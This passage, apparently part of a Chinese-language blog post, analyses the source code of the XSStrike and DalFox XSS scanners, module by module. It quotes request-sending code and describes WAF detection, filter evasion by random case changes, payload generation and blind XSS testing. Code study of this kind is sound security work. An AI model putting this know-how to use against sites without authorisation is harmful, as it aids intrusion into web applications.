+<h2 id="用户交互模块-corepromptpy"><a class="markdownIt-Anchor" href="#用户交互模块-corepromptpy"></a> 用户交互模块 (core/prompt.py)</h2>
+<p>该代码实现了一个<strong>交互式文本编辑器输入功能</strong>，允许用户在外部文本编辑器（如 <code>nano</code>​ 或 <code>vim</code>​）中输入内容，并在编辑完成后返回输入的文本。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">prompt</span>(<span class="params">default=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># try assigning default editor, if fails, use default</span></span><br><span class="line">    editor = os.environ.get(<span class="string">&#x27;EDITOR&#x27;</span>, defaultEditor)</span><br><span class="line">    <span class="comment"># create a temporary file and open it</span></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> tmpfile:</span><br><span class="line">        <span class="keyword">if</span> default:  <span class="comment"># if prompt should have some predefined text</span></span><br><span class="line">            tmpfile.write(default)</span><br><span class="line">            tmpfile.flush()</span><br><span class="line">        child_pid = os.fork()</span><br><span class="line">        is_child = child_pid == <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> is_child:</span><br><span class="line">            <span class="comment"># opens the file in the editor</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.execvp(editor, [editor, tmpfile.name])</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                logger.error(<span class="string">&#x27;You don\&#x27;t have either a default $EDITOR \</span></span><br><span class="line"><span class="string">value defined nor \&#x27;nano\&#x27; text editor&#x27;</span>)</span><br><span class="line">                logger.info(<span class="string">&#x27;Execute %s`export EDITOR=/pat/to/your/editor` \</span></span><br><span class="line"><span class="string">%sthen run XSStrike again.\n\n&#x27;</span> % (yellow,white))</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.waitpid(child_pid, <span class="number">0</span>)  <span class="comment"># wait till the editor gets closed</span></span><br><span class="line">            tmpfile.seek(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> tmpfile.read().strip()  <span class="comment"># read the file</span></span><br></pre></td></tr></table></figure>
+<p><strong>功能</strong>：使用外部文本编辑器让用户输入内容，并返回编辑后的文本。<br />
+<strong>关键技术</strong>：</p>
+<ul>
+<li>
+<p><strong>​<code>tempfile</code>​</strong>​ 创建临时文件存储输入内容。</p>
+</li>
+<li>
+<p><strong>​<code>os.fork()</code>​</strong> ​ 创建子进程打开编辑器。</p>
+</li>
+<li>
+<p><strong>​<code>os.execvp()</code>​</strong> ​ 启动编辑器并传入临时文件。</p>
+</li>
+<li>
+<p><strong>​<code>os.waitpid()</code>​</strong> ​ 等待用户完成编辑。<br />
+<strong>适用场景</strong>：</p>
+<ul>
+<li>适用于 <strong>命令行工具</strong>（如安全测试工具 <code>XSStrike</code>​）。</li>
+<li><strong>让用户更方便地输入复杂数据</strong>（如 SQL、HTML、代码片段等）。</li>
+</ul>
+</li>
+</ul>
+<h2 id="http请求模块-corerequesterpy"><a class="markdownIt-Anchor" href="#http请求模块-corerequesterpy"></a> HTTP请求模块 (core/requester.py)</h2>
+<p>该模块处理所有HTTP请求，是工具与目标网站交互的核心。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">requester</span>(<span class="params">url, data, headers, GET, delay, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> getVar(<span class="string">&#x27;jsonData&#x27;</span>):</span><br><span class="line">        data = converter(data)</span><br><span class="line">    <span class="keyword">elif</span> getVar(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        url = converter(data, url)</span><br><span class="line">        data = []</span><br><span class="line">        GET, POST = <span class="literal">True</span>, <span class="literal">False</span></span><br><span class="line">    time.sleep(delay)</span><br><span class="line">    user_agents = [<span class="string">&#x27;Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User-Agent&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</span><br><span class="line">        headers[<span class="string">&#x27;User-Agent&#x27;</span>] = random.choice(user_agents)</span><br><span class="line">    <span class="keyword">elif</span> headers[<span class="string">&#x27;User-Agent&#x27;</span>] == <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">        headers[<span class="string">&#x27;User-Agent&#x27;</span>] = random.choice(user_agents)</span><br><span class="line">    logger.debug(<span class="string">&#x27;Requester url: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">    logger.debug(<span class="string">&#x27;Requester GET: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(GET))</span><br><span class="line">    logger.debug_json(<span class="string">&#x27;Requester data:&#x27;</span>, data)</span><br><span class="line">    logger.debug_json(<span class="string">&#x27;Requester headers:&#x27;</span>, headers)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> GET:</span><br><span class="line">            response = requests.get(url, params=data, headers=headers,</span><br><span class="line">                                    timeout=timeout, verify=<span class="literal">False</span>, proxies=core.config.proxies)</span><br><span class="line">        <span class="keyword">elif</span> getVar(<span class="string">&#x27;jsonData&#x27;</span>):</span><br><span class="line">            response = requests.post(url, json=data, headers=headers,</span><br><span class="line">                                    timeout=timeout, verify=<span class="literal">False</span>, proxies=core.config.proxies)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = requests.post(url, data=data, headers=headers,</span><br><span class="line">                                     timeout=timeout, verify=<span class="literal">False</span>, proxies=core.config.proxies)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> ProtocolError:</span><br><span class="line">        logger.warning(<span class="string">&#x27;WAF is dropping suspicious requests.&#x27;</span>)</span><br><span class="line">        logger.warning(<span class="string">&#x27;Scanning will continue after 10 minutes.&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">600</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logger.warning(<span class="string">&#x27;Unable to connect to the target.&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> requests.Response()</span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>处理所有HTTP请求，支持GET和POST方法</p>
+</li>
+<li>
+<p>实现请求延迟功能，避免过快发送请求导致被封</p>
+</li>
+<li>
+<p>使用随机User-Agent，模拟不同的浏览器</p>
+</li>
+<li>
+<p>支持自定义请求头</p>
+</li>
+<li>
+<p>支持代理服务器，通过proxies配置</p>
+</li>
+<li>
+<p>处理各种请求异常:</p>
+<ul>
+<li>超时</li>
+<li>连接拒绝</li>
+<li>过多重定向</li>
+<li>其他请求异常</li>
+</ul>
+</li>
+<li>
+<p>忽略SSL警告，允许访问自签名证书的网站</p>
+</li>
+<li>
+<p>返回响应对象或在出错时返回None</p>
+</li>
+<li>
+<p>这个模块是整个工具的基础，所有与目标网站的交互都通过它进行</p>
+</li>
+</ul>
+<h2 id="更新模块-coreupdaterpy"><a class="markdownIt-Anchor" href="#更新模块-coreupdaterpy"></a> 更新模块 (core/updater.py)</h2>
+<p>该模块用于检查和更新XSStrike到最新版本。</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>检查XSStrike是否有新版本可用</p>
+</li>
+<li>
+<p>支持两种更新方式:</p>
+<ul>
+<li>通过Git更新(如果是Git仓库)</li>
+<li>通过下载ZIP文件更新(如果不是Git仓库)</li>
+</ul>
+</li>
+<li>
+<p>根据操作系统选择不同的下载和解压方法:</p>
+<ul>
+<li>Windows: 使用PowerShell命令</li>
+<li>Linux/Mac: 使用wget/curl和unzip命令</li>
+</ul>
+</li>
+<li>
+<p>显示更新前后的版本信息</p>
+</li>
+<li>
+<p>处理更新过程中可能出现的错误</p>
+</li>
+<li>
+<p>这个模块确保用户能够使用最新版本的XSStrike，获取最新的功能和漏洞修复</p>
+</li>
+</ul>
+<h2 id="工具函数模块-coreutilspy"><a class="markdownIt-Anchor" href="#工具函数模块-coreutilspy"></a> 工具函数模块 (core/utils.py)</h2>
+<p>该模块包含各种辅助函数，供其他模块使用。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302141735-ezqi3my.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>提供各种辅助函数，供其他模块使用:</p>
+<ul>
+<li>extractHeaders: 从字符串中提取HTTP头</li>
+<li>getUrl: 从URL中提取基本URL(不含参数)</li>
+<li>getParams: 从URL或POST数据中提取参数</li>
+<li>randomString: 生成指定长度的随机字符串</li>
+<li>randomUpper: 随机将字符串中的字符转换为大写，用于绕过大小写过滤</li>
+<li>replacer: 替换字符串中的指定子串</li>
+<li>extractScripts: 从响应中提取所有JavaScript代码</li>
+<li>verboseOutput: 输出详细的响应信息，用于调试</li>
+<li>fillHoles: 填充新字符串中的空洞，用于构建有效载荷</li>
+<li>removeTags: 从HTML中移除所有标签</li>
+<li>converter: 转换数据格式，支持URL编码和解码</li>
+<li>genGen: 生成XSS有效载荷生成器，根据各种组件创建多样化的有效载荷</li>
+</ul>
+</li>
+<li>
+<p>这些函数提供了基础功能，简化了其他模块的代码</p>
+</li>
+<li>
+<p>通过这些工具函数，XSStrike能够更有效地处理URL、参数、HTTP头和有效载荷</p>
+</li>
+</ul>
+<h2 id="waf检测模块-corewafdetectorpy"><a class="markdownIt-Anchor" href="#waf检测模块-corewafdetectorpy"></a> WAF检测模块 (core/wafDetector.py)</h2>
+<p>该模块用于检测目标网站是否使用了Web应用防火墙(WAF)，以及WAF的类型。借助db目录下的wafSignatuers.json里面的waf签名</p>
+<p>该代码是 <strong>Web 应用防火墙（WAF）检测模块</strong>，用于判断目标网站是否部署了 WAF，并尝试识别其具体厂商或类型。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302141911-152cvz3.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>检测目标网站是否使用了Web应用防火墙(WAF)</p>
+</li>
+<li>
+<p>发送包含明显XSS有效载荷的请求，观察响应</p>
+</li>
+<li>
+<p>分析响应状态码:</p>
+<ul>
+<li>4xx状态码可能表示客户端错误，可能是WAF拦截</li>
+<li>5xx状态码可能表示服务器错误，可能是WAF导致</li>
+</ul>
+</li>
+<li>
+<p>使用预定义的WAF签名(来自db/wafSignatuers.json)检查响应头和响应体</p>
+</li>
+<li>
+<p>如果匹配到WAF签名，识别并报告WAF类型</p>
+</li>
+<li>
+<p>返回布尔值，表示是否检测到WAF</p>
+</li>
+<li>
+<p>这种检测有助于确定后续扫描的策略，因为不同的WAF需要不同的绕过技术</p>
+</li>
+</ul>
+<h2 id="表单处理模块-corezetanizepy"><a class="markdownIt-Anchor" href="#表单处理模块-corezetanizepy"></a> 表单处理模块 (core/zetanize.py)</h2>
+<p>该模块用于处理和分析HTML表单，提取表单字段和属性。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302142233-60t92yg.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>分析URL中的HTML表单，提取表单字段和属性</p>
+</li>
+<li>
+<p>发送GET请求获取页面内容</p>
+</li>
+<li>
+<p>使用正则表达式提取所有表单:</p>
+<ul>
+<li>表单的action属性(提交目标)</li>
+<li>表单的method属性(GET或POST)</li>
+<li>表单中的所有input字段及其默认值</li>
+</ul>
+</li>
+<li>
+<p>处理相对路径的action属性，将其转换为绝对路径</p>
+</li>
+<li>
+<p>如果表单没有指定method，默认为GET</p>
+</li>
+<li>
+<p>返回包含所有表单信息的字典，每个表单包含action、method和inputs</p>
+</li>
+<li>
+<p>这些信息用于后续的表单测试，自动填充表单并提交，检测XSS漏洞</p>
+</li>
+</ul>
+<h2 id="modes目录下文件分析"><a class="markdownIt-Anchor" href="#modes目录下文件分析"></a> modes目录下文件分析</h2>
+<h3 id="bruteforcerpy"><a class="markdownIt-Anchor" href="#bruteforcerpy"></a> <a class="link"   target="_blank" rel="noopener" href="http://bruteforcer.py" >bruteforcer.py<i class="fas fa-external-link-alt"></i></a></h3>
+<p><a class="link"   target="_blank" rel="noopener" href="http://bruteforcer.py" >bruteforcer.py<i class="fas fa-external-link-alt"></i></a> 文件实现了一个暴力破解功能，用于测试网站参数对 XSS (跨站脚本) 攻击的脆弱性。它通过以下步骤工作：</p>
+<ul>
+<li>接收目标 URL、参数数据、有效载荷列表和其他配置</li>
+<li>确定请求类型（GET 或 POST）</li>
+<li>解析 URL 和参数</li>
+<li>对每个参数，使用提供的有效载荷列表进行测试</li>
+<li>检查响应中是否包含有效载荷，如果包含则记录成功</li>
+</ul>
+<p>主要函数：文件中定义了一个主要函数 bruteforcer，它接受以下参数：</p>
+<ul>
+<li>target: 目标 URL</li>
+<li>paramData: POST 请求的参数数据</li>
+<li>payloadList: 要测试的有效载荷列表</li>
+<li>encoding: 编码函数（如果需要对有效载荷进行编码）</li>
+<li>headers: HTTP 请求头</li>
+<li>delay: 请求之间的延迟时间</li>
+<li>timeout: 请求超时时间</li>
+</ul>
+<h3 id="crawlpy"><a class="markdownIt-Anchor" href="#crawlpy"></a> <a class="link"   target="_blank" rel="noopener" href="http://crawl.py" >crawl.py<i class="fas fa-external-link-alt"></i></a></h3>
+<p><a class="link"   target="_blank" rel="noopener" href="http://crawl.py" >crawl.py<i class="fas fa-external-link-alt"></i></a> 实现了网站爬虫功能，用于发现网站中的表单和可能存在的 XSS 漏洞。</p>
+<p>功能：</p>
+<ul>
+<li>爬取网站表单</li>
+<li>分析表单中的输入字段</li>
+<li>对每个输入字段进行 XSS 测试</li>
+<li>支持盲 XSS 测试</li>
+</ul>
+<p>工作流程：</p>
+<ul>
+<li>接收网站 URL 和表单数据</li>
+<li>解析表单的 action URL，确保它是完整的 URL</li>
+<li>提取表单中的输入字段</li>
+<li>对每个输入字段，插入 XSS 检查器（xsschecker）</li>
+<li>分析响应，检查 XSS 漏洞</li>
+<li>如果发现漏洞，生成有效载荷并报告</li>
+<li>如果启用了盲 XSS，则发送盲 XSS 有效载荷</li>
+</ul>
+<h3 id="scanpy"><a class="markdownIt-Anchor" href="#scanpy"></a> <a class="link"   target="_blank" rel="noopener" href="http://scan.py" >scan.py<i class="fas fa-external-link-alt"></i></a></h3>
+<p><a class="link"   target="_blank" rel="noopener" href="http://scan.py" >scan.py<i class="fas fa-external-link-alt"></i></a> 是 XSStrike 的核心扫描模块，用于对单个 URL 进行全面的 XSS 漏洞扫描。</p>
+<p>功能：</p>
+<ul>
+<li>检测 DOM XSS 漏洞</li>
+<li>检测 WAF（Web 应用防火墙）</li>
+<li>分析参数反射位置</li>
+<li>生成针对特定上下文的有效载荷</li>
+<li>测试有效载荷的有效性</li>
+</ul>
+<p>工作流程：</p>
+<ul>
+<li>确定请求方法（GET 或 POST）</li>
+<li>检查 DOM XSS 漏洞（如果未跳过）</li>
+<li>检测 WAF</li>
+<li>对每个参数进行测试：</li>
+<li>插入 XSS 检查器</li>
+<li>分析响应中的反射位置</li>
+<li>分析反射的上下文（HTML、属性、脚本等）</li>
+<li>生成针对特定上下文的有效载荷</li>
+<li>测试有效载荷的有效性</li>
+<li>报告成功的有效载荷</li>
+</ul>
+<h3 id="singlefuzzpy"><a class="markdownIt-Anchor" href="#singlefuzzpy"></a> <a class="link"   target="_blank" rel="noopener" href="http://singleFuzz.py" >singleFuzz.py<i class="fas fa-external-link-alt"></i></a></h3>
+<p><a class="link"   target="_blank" rel="noopener" href="http://singleFuzz.py" >singleFuzz.py<i class="fas fa-external-link-alt"></i></a> 实现了模糊测试功能，用于测试目标对各种 XSS 相关字符和模式的响应。</p>
+<p>功能：</p>
+<ul>
+<li>检测 WAF</li>
+<li>对每个参数进行模糊测试</li>
+<li>使用预定义的模糊字符串列表</li>
+<li>分析目标对不同输入的响应</li>
+</ul>
+<p>工作流程：</p>
+<ul>
+<li>确定请求方法（GET 或 POST）</li>
+<li>检测 WAF</li>
+<li>对每个参数进行模糊测试：</li>
+<li>将参数值设置为 XSS 检查器</li>
+<li>调用 fuzzer 函数进行模糊测试</li>
+<li>fuzzer 函数会使用预定义的模糊字符串列表，并分析响应</li>
+</ul>
+<h2 id="plugins目录下文件分析"><a class="markdownIt-Anchor" href="#plugins目录下文件分析"></a> plugins目录下文件分析</h2>
+<h3 id="retirejspy"><a class="markdownIt-Anchor" href="#retirejspy"></a> <a class="link"   target="_blank" rel="noopener" href="http://retireJs.py" >retireJs.py<i class="fas fa-external-link-alt"></i></a></h3>
+<p><a class="link"   target="_blank" rel="noopener" href="http://retireJs.py" >retireJs.py<i class="fas fa-external-link-alt"></i></a> 是一个用于检测网页中使用的过时或有漏洞的 JavaScript 库的插件。 ----会调用db目录下的<code>definitions.json</code>​文件</p>
+<p>功能：</p>
+<ul>
+<li>扫描网页中引用的 JavaScript 文件</li>
+<li>检测这些 JavaScript 库是否存在已知的安全漏洞</li>
+<li>提供有关发现的漏洞的详细信息，如 CVE 编号、严重性等</li>
+</ul>
+<p>工作流程：</p>
+<ul>
+<li>从网页响应中提取所有 JavaScript 文件的 URL</li>
+<li>对于每个未检查过的 JavaScript 文件：</li>
+<li>将其添加到已检查列表中</li>
+<li>发送请求获取 JavaScript 文件内容</li>
+<li>扫描文件内容，检查是否匹配已知的有漏洞的 JavaScript 库</li>
+<li>如果发现漏洞，输出详细信息</li>
+</ul>
+<h1 id="dalfox"><a class="markdownIt-Anchor" href="#dalfox"></a> dalfox</h1>
+<p>DalFox 是一个开源的 XSS(跨站脚本)扫描和参数分析工具，用 Go 语言编写。它能够自动发现 Web 应用程序中的 XSS 漏洞，并提供详细的分析报告。该工具支持多种扫描模式，包括单目标扫描、批量扫描、文件扫描等，并提供了丰富的自定义选项。</p>
+<h2 id="入口函数分析"><a class="markdownIt-Anchor" href="#入口函数分析"></a> 入口函数分析</h2>
+<p>项目的入口函数位于 dalfox.go 中：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd.Execute()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个简单的入口函数调用了 cmd 包中的 Execute() 函数，该函数在 cmd/root.go 中定义，负责初始化命令行界面并执行用户指定的命令。Execute() 函数使用 Cobra 库来处理命令行参数和子命令。</p>
+<h2 id="目录结构和代码详细分析"><a class="markdownIt-Anchor" href="#目录结构和代码详细分析"></a> 目录结构和代码详细分析</h2>
+<h3 id="cmd-目录"><a class="markdownIt-Anchor" href="#cmd-目录"></a> cmd 目录</h3>
+<p>cmd 目录包含了命令行界面相关的代码，使用 Cobra 库实现命令行功能。</p>
+<ul>
+<li>
+<p>root.go:</p>
+<ul>
+<li>定义了根命令和全局选项</li>
+<li>实现了 Execute() 函数，作为程序的主入口点</li>
+<li>通过 initConfig() 函数初始化配置，包括加载配置文件、设置命令行参数等</li>
+<li>定义了大量的命令行选项，如 header、cookie、proxy 等，这些选项被存储在 Args 结构体中</li>
+<li>实现了 HAR 文件写入器的初始化功能</li>
+</ul>
+</li>
+<li>
+<p>args.go:</p>
+<ul>
+<li>定义了 Args 结构体，用于存储用户通过命令行输入的各种选项</li>
+<li>包含了多种类型的字段：字符串切片、字符串、整数和布尔值</li>
+<li>这些选项涵盖了扫描配置、HTTP 请求设置、输出格式等各个方面</li>
+</ul>
+</li>
+<li>
+<p>url.go:</p>
+<ul>
+<li>实现了单一 URL 扫描模式的命令</li>
+<li>通过 runURLCmd 函数处理单个 URL 的扫描</li>
+<li>调用 scanning.Scan 函数执行实际的扫描操作</li>
+<li>处理输出格式化，支持 JSON 和普通文本格式</li>
+</ul>
+</li>
+<li>
+<p>file.go:</p>
+<ul>
+<li>实现了从文件读取目标的扫描模式</li>
+<li>支持多种文件格式，包括原始 HTTP 请求和 HAR 文件</li>
+<li>通过 runFileMode 和 runRawDataMode 函数处理不同类型的文件输入</li>
+<li>解析文件内容，提取目标 URL 和其他参数</li>
+</ul>
+</li>
+<li>
+<p>pipe.go:</p>
+<ul>
+<li>实现了从标准输入读取目标的扫描模式</li>
+<li>允许通过管道将目标传递给 DalFox</li>
+<li>支持批量处理多个 URL</li>
+</ul>
+</li>
+<li>
+<p>payload.go:</p>
+<ul>
+<li>实现了生成和枚举 XSS 有效载荷的命令</li>
+<li>定义了 Object 结构体，用于表示不同类型的有效载荷</li>
+<li>支持多种类型的 XSS 有效载荷生成，包括常见的、HTML 内的、属性内的和 JavaScript 内的</li>
+<li>支持从远程源（如 Payloadbox 和 PortSwigger）获取有效载荷</li>
+<li>提供了 URL 编码选项</li>
+</ul>
+</li>
+<li>
+<p>server.go:</p>
+<ul>
+<li>实现了 API 服务器模式，允许通过 HTTP API 使用 DalFox 功能</li>
+<li>定义了服务器的主机和端口选项</li>
+<li>调用 server.RunAPIServer 函数启动 API 服务器</li>
+</ul>
+</li>
+</ul>
+<h3 id="lib-目录"><a class="markdownIt-Anchor" href="#lib-目录"></a> lib 目录</h3>
+<p>lib 目录包含了供外部应用程序调用的库函数，使 DalFox 可以作为库被其他 Go 程序集成。</p>
+<ul>
+<li>
+<p>func.go:</p>
+<ul>
+<li>提供了 Initialize 函数，用于初始化扫描选项</li>
+<li>实现了选项合并逻辑，允许用户自定义选项覆盖默认值</li>
+<li>返回 model.Options 结构体，包含了所有扫描配置</li>
+</ul>
+</li>
+<li>
+<p>interface.go:</p>
+<ul>
+<li>定义了 Options 结构体，作为库模式的配置接口</li>
+<li>定义了 Target 结构体，表示扫描目标</li>
+<li>定义了 Result 结构体，表示扫描结果</li>
+<li>这些结构体使得 DalFox 可以作为库被其他 Go 程序调用</li>
+</ul>
+</li>
+</ul>
+<h3 id="pkg-目录"><a class="markdownIt-Anchor" href="#pkg-目录"></a> pkg 目录</h3>
+<p>pkg 目录包含了核心功能实现，分为多个子包。</p>
+<h4 id="scanning-包"><a class="markdownIt-Anchor" href="#scanning-包"></a> scanning 包</h4>
+<ul>
+<li>
+<p>scan.go:</p>
+<ul>
+<li>实现了主要的扫描逻辑</li>
+<li>定义了 Scan 函数，作为扫描的入口点</li>
+<li>实现了参数分析、XSS 检测、其他漏洞检测等功能</li>
+<li>处理不同类型的 XSS 有效载荷生成和测试</li>
+<li>支持盲打 XSS 检测</li>
+<li>实现了结果收集和报告生成</li>
+</ul>
+</li>
+<li>
+<p>sendReq.go:</p>
+<ul>
+<li>实现了 SendReq 函数，处理 HTTP 请求的发送和响应的处理</li>
+<li>支持各种 HTTP 方法（GET、POST 等）</li>
+<li>实现了响应内容的解析和分析</li>
+<li>处理 gzip 压缩的响应</li>
+<li>实现了漏洞检测逻辑，如 CRLF 注入、SSTI 等</li>
+</ul>
+</li>
+<li>
+<p>parameterAnlaysis.go:</p>
+<ul>
+<li>实现了参数分析功能，用于发现可能的注入点</li>
+<li>支持字典和 DOM 分析</li>
+<li>实现了参数挖掘功能，自动发现潜在的参数</li>
+<li>检测参数反射点和类型</li>
+<li>支持 WAF 检测</li>
+</ul>
+</li>
+<li>
+<p>bav.go:</p>
+<ul>
+<li>实现了基本漏洞分析(Basic Another Vulnerability)功能</li>
+<li>包含 SSTI、CRLF、SQL 注入、开放重定向等漏洞的检测逻辑</li>
+<li>使用并发处理多个请求</li>
+<li>实现了不同类型的有效载荷生成</li>
+</ul>
+</li>
+<li>
+<p>entity.go:</p>
+<ul>
+<li>定义了各种实体和接口，如 XSS 参数、事件处理程序等</li>
+<li>提供了获取不同类型实体的函数</li>
+<li>实现了实体列表的管理和访问</li>
+</ul>
+</li>
+<li>
+<p>grep.go:</p>
+<ul>
+<li>实现了响应内容的正则匹配功能</li>
+<li>定义了 Grepping 函数，用于检查模式</li>
+<li>实现了内置的 grep 模式和自定义 grep 模式</li>
+<li>支持多种漏洞的特征检测</li>
+</ul>
+</li>
+<li>
+<p>codeview.go:</p>
+<ul>
+<li>实现了代码查看功能，用于显示反射点</li>
+<li>帮助用户理解漏洞的位置和上下文</li>
+</ul>
+</li>
+<li>
+<p>foundaction.go:</p>
+<ul>
+<li>实现了发现漏洞后的自定义操作</li>
+<li>支持执行外部命令</li>
+<li>支持发送通知</li>
+</ul>
+</li>
+</ul>
+<h4 id="server-包"><a class="markdownIt-Anchor" href="#server-包"></a> server 包</h4>
+<ul>
+<li>
+<p>server.go:</p>
+<ul>
+<li>实现了 REST API 服务器</li>
+<li>使用 Echo 框架处理 HTTP 请求</li>
+<li>定义了健康检查、扫描列表和扫描详情等端点</li>
+<li>支持异步扫描</li>
+</ul>
+</li>
+<li>
+<p>model.go:</p>
+<ul>
+<li>定义了 API 服务器使用的数据结构</li>
+<li>包含 Req 结构体，表示请求</li>
+<li>包含 Res 结构体，表示响应</li>
+<li>包含 Scans 结构体，表示扫描列表</li>
+</ul>
+</li>
+</ul>
+<h4 id="har-包"><a class="markdownIt-Anchor" href="#har-包"></a> har 包</h4>
+<ul>
+<li>
+<p>client_tracer.go:</p>
+<ul>
+<li>实现了 HTTP 请求跟踪功能，用于生成 HAR 文件</li>
+<li>记录 HTTP 请求和响应的详细信息</li>
+<li>跟踪 DNS 查询、TLS 握手等网络事件</li>
+<li>计算各种时间指标</li>
+</ul>
+</li>
+</ul>
+<h4 id="model-包"><a class="markdownIt-Anchor" href="#model-包"></a> model 包</h4>
+<ul>
+<li>
+<p>options.go:</p>
+<ul>
+<li>定义了 Options 结构体，表示扫描选项</li>
+<li>包含了所有配置选项，如 HTTP 头、Cookie、代理等</li>
+<li>定义了 Scan 结构体，表示单次扫描的状态</li>
+<li>定义了 PoC 结构体，表示漏洞证明</li>
+</ul>
+</li>
+</ul>
+<h4 id="printing-包"><a class="markdownIt-Anchor" href="#printing-包"></a> printing 包</h4>
+<ul>
+<li>
+<p>util.go:</p>
+<ul>
+<li>提供了输出格式化和显示控制的功能</li>
+<li>实现了不同级别的日志输出</li>
+<li>支持彩色输出</li>
+<li>实现了进度显示</li>
+</ul>
+</li>
+</ul>
+<h3 id="samples-目录"><a class="markdownIt-Anchor" href="#samples-目录"></a> samples 目录</h3>
+<p>samples 目录包含了示例代码，展示如何使用 DalFox 作为库。</p>
+<ul>
+<li>
+<p>sample_lib.go.txt:</p>
+<ul>
+<li>展示了如何在 Go 程序中使用 DalFox 库进行扫描</li>
+<li>演示了如何设置扫描选项和执行扫描</li>
+<li>展示了如何处理扫描结果</li>
+</ul>
+</li>
+</ul>
+<h1 id="dalfox-和-xsstrike-整合分析"><a class="markdownIt-Anchor" href="#dalfox-和-xsstrike-整合分析"></a> DalFox 和 XSStrike 整合分析</h1>
+<h2 id="两个项目概述"><a class="markdownIt-Anchor" href="#两个项目概述"></a> 两个项目概述</h2>
+<h3 id="dalfox-2"><a class="markdownIt-Anchor" href="#dalfox-2"></a> DalFox</h3>
+<p>DalFox 是一个用 Go 编写的强大的开源 XSS 扫描器，专注于自动化。它具有多种扫描模式、参数挖掘、WAF 检测、DOM XSS 检测等功能。</p>
+<h3 id="xsstrike-2"><a class="markdownIt-Anchor" href="#xsstrike-2"></a> XSStrike</h3>
+<p>XSStrike 是一个用 Python 编写的 XSS 扫描器，具有强大的有效载荷生成、WAF 检测和绕过、DOM XSS 检测等功能。</p>
+<h2 id="各自的优势"><a class="markdownIt-Anchor" href="#各自的优势"></a> 各自的优势</h2>
+<h3 id="dalfox-优势"><a class="markdownIt-Anchor" href="#dalfox-优势"></a> DalFox 优势</h3>
+<ul>
+<li>高性能并发架构：使用 Go 语言的并发特性</li>
+<li>多种扫描模式：URL、SXSS（存储型 XSS）、文件、管道等</li>
